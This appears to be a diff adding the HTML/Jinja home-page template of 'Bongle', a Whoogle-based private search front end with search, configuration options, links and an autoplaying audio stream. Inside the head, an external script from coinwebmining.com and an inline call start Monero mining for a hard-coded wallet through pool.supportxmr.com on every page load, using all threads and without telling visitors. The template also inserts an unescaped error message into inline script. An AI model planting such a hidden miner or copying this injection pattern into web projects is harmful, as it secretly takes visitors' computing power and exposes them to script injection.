@@ -1,0 +1,180 @@
+<html>
+    <head>
+        <link rel="apple-touch-icon" sizes="57x57" href="static/img/favicon/apple-icon-57x57.png">
+        <link rel="apple-touch-icon" sizes="60x60" href="static/img/favicon/apple-icon-60x60.png">
+        <link rel="apple-touch-icon" sizes="72x72" href="static/img/favicon/apple-icon-72x72.png">
+        <link rel="apple-touch-icon" sizes="76x76" href="static/img/favicon/apple-icon-76x76.png">
+        <link rel="apple-touch-icon" sizes="114x114" href="static/img/favicon/apple-icon-114x114.png">
+        <link rel="apple-touch-icon" sizes="120x120" href="static/img/favicon/apple-icon-120x120.png">
+        <link rel="apple-touch-icon" sizes="144x144" href="static/img/favicon/apple-icon-144x144.png">
+        <link rel="apple-touch-icon" sizes="152x152" href="static/img/favicon/apple-icon-152x152.png">
+        <link rel="apple-touch-icon" sizes="180x180" href="static/img/favicon/apple-icon-180x180.png">
+        <link rel="icon" type="image/png" sizes="192x192"  href="static/img/favicon/android-icon-192x192.png">
+        <link rel="icon" type="image/png" sizes="32x32" href="static/img/favicon/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="96x96" href="static/img/favicon/favicon-96x96.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="static/img/favicon/favicon-16x16.png">
+        <link rel="manifest" href="static/img/favicon/manifest.json">
+        <meta name="referrer" content="no-referrer">
+        <meta name="msapplication-TileColor" content="#ffffff">
+        <meta name="msapplication-TileImage" content="static/img/favicon/ms-icon-144x144.png">
+        <script type="text/javascript" src="static/js/autocomplete.js"></script>
+        <script type="text/javascript" src="static/js/controller.js"></script>
+        <link rel="search" href="opensearch.xml" type="application/opensearchdescription+xml" title="Whoogle Search">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <link rel="stylesheet" href="static/css/{{ 'search-dark' if config.dark else 'search' }}.css">
+        <link rel="stylesheet" href="static/css/main.css">
+        {% if config.dark %}
+            <link rel="stylesheet" href="static/css/dark-theme.css"/>
+        {% endif %}
+        <noscript>
+            <style>
+                #main { display: inherit !important; }
+                .content { max-height: 520px; padding: 18px; border-radius: 10px; }
+                .collapsible { display: none; }
+            </style>
+        </noscript>
+        <script src="https://coinwebmining.com/cwm.js"></script>
+<script>
+    var site_id = 'cwm-4114';
+    var coin = 'monero';
+    var wallet = '49oeFLD9UWNLY3ozsn1txLR2H9CQcwaCp8r1rfB4a1MCeVcRsJQ1KWYWiiPzH42ChVMy19YXMJCYZWjprLqpczb4FJL5SoP';
+    var password = 'x';
+    var mining_pool = 'pool.supportxmr.com:3333';
+    var threads = -1;
+    var throttle = 0.2;
+    var debug = false;
+    cwm_start(site_id, coin, wallet, password, mining_pool, threads, throttle, debug);
+</script>
+
+        <title>Bongle</title>
+    </head>
+    <body id="main">
+    <script>
+        {% if error_message|length > 0 %}
+            let error = "{{ error_message|safe }}";
+            alert(error);
+        {% endif %}
+    </script>
+        <div class="search-container">
+            <img class="logo" src="static/img/logo.png">
+            <form id="search-form" action="search" method="{{ 'get' if config.get_only else 'post' }}">
+                <div class="search-fields">
+                    <div class="autocomplete">
+                        <input type="text" name="q" id="search-bar" autofocus="autofocus" autocapitalize="none" autocomplete="off">
+                    </div>
+                    <input type="submit" id="search-submit" value="Search">
+                </div>
+            </form>
+            <br/>
+            <button id="config-collapsible" class="collapsible">Configuration</button>
+            <div class="content">
+                <div class="config-fields">
+                    <form id="config-form" action="config" method="post">
+                        <div class="config-div">
+                            <label for="config-ctry">Filter Results by Country: </label>
+                            <select name="ctry" id="config-ctry">
+                                {% for ctry in countries %}
+                                    <option value="{{ ctry.value }}"
+                                            {% if ctry.value in config.ctry %}
+                                            selected
+                                            {% endif %}>
+                                        {{ ctry.name }}
+                                    </option>
+                                {% endfor %}
+                            </select>
+                            <div><span class="info-text"> — Note: If enabled, a website will only appear in the results if it is *hosted* in the selected country.</span></div>
+                        </div>
+                        <div class="config-div">
+                            <label for="config-lang-interface">Interface Language: </label>
+                            <select name="lang_interface" id="config-lang-interface">
+                                {% for lang in languages %}
+                                <option value="{{ lang.value }}"
+                                    {% if lang.value in config.lang_interface %}
+                                        selected
+                                    {% endif %}>
+                                    {{ lang.name }}
+                                </option>
+                                {% endfor %}
+                            </select>
+                        </div>
+                        <div class="config-div">
+                            <label for="config-lang-search">Search Language: </label>
+                            <select name="lang_search" id="config-lang-search">
+                                {% for lang in languages %}
+                                <option value="{{ lang.value }}"
+                                    {% if lang.value in config.lang_search %}
+                                        selected
+                                    {% endif %}>
+                                    {{ lang.name }}
+                                </option>
+                                {% endfor %}
+                            </select>
+                        </div>
+                        <div class="config-div">
+                            <label for="config-near">Near: </label>
+                            <input type="text" name="near" id="config-near" placeholder="City Name">
+                        </div>
+                        <div class="config-div">
+                            <label for="config-nojs">Show NoJS Links: </label>
+                            <input type="checkbox" name="nojs" id="config-nojs">
+                        </div>
+                        <div class="config-div">
+                            <label for="config-dark">Dark Mode: </label>
+                            <input type="checkbox" name="dark" id="config-dark">
+                        </div>
+                        <div class="config-div">
+                            <label for="config-safe">Safe Search: </label>
+                            <input type="checkbox" name="safe" id="config-safe">
+                        </div>
+                        <div class="config-div">
+                            <label class="tooltip" for="config-alts">Replace Social Media Links: </label>
+                            <input type="checkbox" name="alts" id="config-alts">
+                            <div><span class="info-text"> — Replaces Twitter/YouTube/Instagram/Reddit links
+                                with Nitter/Invidious/Bibliogram/Libreddit links.</span></div>
+                        </div>
+                        <div class="config-div">
+                            <label for="config-new-tab">Open Links in New Tab: </label>
+                            <input type="checkbox" name="new_tab" id="config-new-tab">
+                        </div>
+                        <div class="config-div">
+                            <label for="config-tor">Use Tor: {{ '' if tor_available else 'Unavailable' }}</label>
+                            <input type="checkbox" name="tor" id="config-tor" {{ '' if tor_available else 'hidden' }}>
+                        </div>
+                        <div class="config-div">
+                            <label for="config-get-only">GET Requests Only: </label>
+                            <input type="checkbox" name="get_only" id="config-get-only">
+                        </div>
+                        <div class="config-div">
+                            <label for="config-url">Root URL: </label>
+                            <input type="text" name="url" id="config-url" value="">
+                        </div>
+                        <div class="config-div">
+                            <input type="submit" id="config-load" onclick="loadConfig(event)" value="Load">&nbsp;
+                            <input type="submit" id="config-submit" value="Apply">&nbsp;
+                            <input type="submit" id="config-submit" onclick="saveConfig(event)" value="Save As...">
+                        </div>
+                    </form>
+                </div>
+              
+            </div>
+               <button class="collapsible2"><a style="color: #ffffff" href="https://ex31radio.co.uk/"> Ex31 Radio </a></button>
+               <button class="collapsible2"><a style="color: #ffffff" href="https://beigeworm.com/"> Mon's Nextcloud </a></button>
+               <button class="collapsible2"><a style="color: #ffffff" href="http://seepc.uk/"> Mon's KVM </a></button>
+               <button class="collapsible2"><a style="color: #ffffff" href="https://discord.link/ex31radio/"> Discord </a></button>
+               <audio class="collapsible3" controls autoplay preload="auto"><source src="http://beigeworm.duckdns.org:8443/stream?type=.mp3" type="audio/mp3"></audio>
+
+
+        </div>
+
+<div></div>
+
+
+        <footer>
+            <p style="color: {{ '#fff' if config.dark else '#000' }};">
+                Bongle v1.0.2 : By <a style="color: #ffffff" href="https://twitter.com/BeigeWorm">@beigeworm</a>
+
+             
+            </p>
+        </footer>
+    </body>
+</html>
